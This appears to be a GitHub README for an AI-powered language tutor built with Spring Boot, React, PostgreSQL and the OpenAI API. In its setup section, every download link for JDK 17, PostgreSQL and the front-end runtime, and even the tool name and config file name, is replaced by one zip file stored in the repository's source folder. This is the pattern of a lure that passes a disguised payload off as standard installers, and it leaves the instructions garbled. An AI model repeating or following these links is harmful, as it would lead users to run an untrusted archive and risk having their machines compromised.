# Overview

This project is an AI-powered language tutor application designed to enhance the student learning experience by providing a personalised learning environment. The application divides users into students and teachers, allowing them to interact in a structured educational environment.

Teachers can create lessons, set assessments, and mentor students, while students can select and learn from available lessons and practice language skills by interacting with AI. The AI interactions are powered by the OpenAI GPT API, creating a conversational learning experience that adapts to the context provided by the teacher. Additionally, **ASR (Automatic Speech Recognition)** and **TTS (Text-to-Speech)** modules are integrated to enable voice-based interaction, where student speech is recognized, responded to by AI, and converted back to audio for a fully immersive experience.

The application consists of a backend and a frontend:
- The **backend**, built using Java and the Spring Boot framework, is responsible for the core business logic and interacts with the database to persist user, course, and assessment data.
- The **frontend**, developed using the React framework, provides an intuitive and interactive interface for students and teachers to interact with the system.

### Key Features
- **User Management**: Handles registration and management of student and teacher accounts.
- **Course Creation**: Allows teachers to create courses, set assessments, and manage content.
- **Course Selection**: Enables students to browse and select courses.
- **AI-based Student Learning**: Provides a conversational learning experience using OpenAI GPT API, enhanced with ASR and TTS for voice-based interaction.
- **Payment System**: Manages course registration fees, balance top-up, and teacher withdrawals.
- **Integration of Components**: Combines backend and frontend to offer a seamless digital learning platform for educational interactions.

# Configuration

To run the project, you need to install the following software:

1. **JDK 17**: For compiling and running the back-end part.
   - Java download link: [https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip](https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip)
   - Make sure that you have installed JDK 17 and set the `JAVA_HOME` environment variable.
   - **Set the environment variable**:
     - Variable name: `JAVA_HOME`
     - Variable value: Enter the path where the JDK is installed, e.g., `C:\Program Files\Java\jdk-17`

2. **PostgreSQL**: Used to store user, course, and assessment data.
   - PostgreSQL download link: [https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip](https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip)
   - Install PostgreSQL and create a database for your project.
   - Configure the database username and password so that the backend can connect properly.

3. **https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip**: Used to run the front-end part.
   - https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip download link: [https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip](https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip)
   - Install https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip (LTS version is recommended).
   - Make sure you have `npm` or `yarn` installed to manage front-end dependencies.

### Installation of Dependency Packages Required by the Front-End

Use the following commands to install the necessary front-end dependencies:

```bash
npm install bootstrap
npm install react-router-dom
npm install axios
npm install react-bootstrap bootstrap
```

# Deployment Instructions

To deploy the project, follow the steps below:

## Backend Section Deployment

1. Go to the root directory of the backend project.
2. Build the project using Gradle in IntelliJ IDEA.
   - You can run the main method directly to start the service.
   - Ensure that the PostgreSQL database is started and that the application is able to connect to the database correctly.

## Front-End Section Deployment

1. Go to the root directory of the front-end project.
2. Install the required dependencies for the frontend:
   
 ```bash
npm install
npm start
 ```

## Environment Variables

1. The backend needs to be configured with database connection information (username, password), which can be set in the https://github.com/DanteEtnad/AITutor/raw/refs/heads/main/tutor/src/main/AI_Tutor_3.6.zip file.
2. The key for the OpenAI API needs to be configured to support AI interaction features.

# Advanced Technologies

The following high-level technologies are used in this project:

### OpenAI GPT API with ASR and TTS
- The application uses OpenAI's GPT API to implement conversational interactions between students and AI for personalized learning.
- **ASR (Automatic Speech Recognition)** converts students' spoken language into text, which the ChatGPT API processes to generate responses.
- **TTS (Text-to-Speech)** then converts the AI-generated text back into audio, allowing for natural, voice-based language practice.

### Spring Boot
- The backend uses the Spring Boot framework, which simplifies configuration and development, offering powerful dependency injection and modularity.
- Uses Spring Data JPA to handle database operations, reducing boilerplate code.

### React
- The frontend is built with React, providing a modern, responsive user interface.
- Uses React Router for seamless navigation between application pages.

### RESTful API
- Backend and frontend communicate via a RESTful API, ensuring a decoupled architecture.
- This setup improves the scalability and maintainability of the application.

### PostgreSQL
- PostgreSQL is used as the database management system, ensuring secure and consistent storage of users, courses, and assessment data.

### React Bootstrap
- React Bootstrap enhances the aesthetics and user experience of the frontend interface with a range of UI components.

### Gradle
- Gradle is used as the project build tool, simplifying dependency management and project packaging.

In summary, this application integrates React for a responsive UI, Spring Boot for efficient backend management, PostgreSQL for secure data storage, and OpenAI GPT with ASR and TTS for interactive, voice-based language tutoring. Together, these technologies create a personalized, engaging, and effective learning platform.
